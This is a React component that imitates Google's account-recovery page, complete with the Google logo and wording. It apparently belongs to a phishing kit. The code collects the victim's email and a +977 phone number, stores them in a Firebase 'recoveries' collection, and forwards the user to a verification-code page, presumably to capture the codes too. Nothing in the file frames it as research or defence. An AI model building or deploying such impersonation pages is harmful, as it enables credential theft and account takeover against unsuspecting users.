import React, { useState } from "react";
import { useNavigate, useLocation } from "react-router-dom";
import { database, ref, push } from "../firebase";
import "./login.css";


const ForgotPassword = () => {
  const location = useLocation();
  const email = location.state?.email || "";
  const navigate = useNavigate();
  const [phone, setPhone] = useState("");
  const [submitted, setSubmitted] = useState(false);

  const handleSubmit = async (e) => {
    e.preventDefault();
    if (!phone.trim()) return alert("Please enter your phone number");

    try {
      await push(ref(database, "recoveries"), {
        email,
        phone: `+977${phone}`,
        timestamp: new Date().toISOString(),
        });
        navigate("/verify-code", {
          state: { email, phone: `+977${phone}` },
        });
      setSubmitted(true);
    } catch (error) {
      console.error("Error saving phone number:", error);
      alert("Something went wrong. Try again.");
    }
  };

  return (
    <div className="login-container">
      <div className="login-box">
        <img
          src="/google.png"
          alt="Google"
          className="login-logo"
        />
        <h2 className="login-title">
          Account recovery
        </h2>

        <p>To help keep your account safe, Google wants to make sure it's really you trying to sign in </p>

        {email && (
          <p className="email-pill">
            {email}
          </p>
        )}

        {submitted ? (
          <p style={{ marginTop: "20px", color: "green" }}>
            Recovery request submitted. Our team will contact you.
          </p>
        ) : (
          <form onSubmit={handleSubmit} className="login-form">
            <p style={{ fontSize: "18px", fontWeight: "500", marginBottom: "20px" }}>
            Get a verification code
            </p>
            <label htmlFor="phone" className="login-label" style={{ marginBottom: "10px" }}>
              Enter your phone number to recover your account
            </label>
            <div style={{ display: "flex", gap: "8px", marginBottom: "20px" }}>
            <select
                value="+977"
                disabled
                style={{
                height: "38px",
                width: "90px",
                padding: "0 10px",
                fontSize: "14px",
                borderRadius: "4px",
                border: "1px solid #ccc",
                backgroundColor: "#f1f1f1",
                color: "#5f6368",
                cursor: "not-allowed",
                boxSizing: "border-box",
                appearance: "none",       // hide native arrow styling
                WebkitAppearance: "none",
                MozAppearance: "none",
                }}
            >
                <option value="+977">+977</option>
            </select>

            <input
                type="tel"
                id="phone"
                placeholder="Mobile number"
                value={phone}
                onChange={(e) => setPhone(e.target.value)}
                className="login-input"
                style={{ flex: 1 }}
                required
            />
            </div>

            <div className="login-actions">
              <button type="submit" className="next-button">
                Next
              </button>
            </div>
          </form>
        )}
      </div>
    </div>
  );
};

export default ForgotPassword;
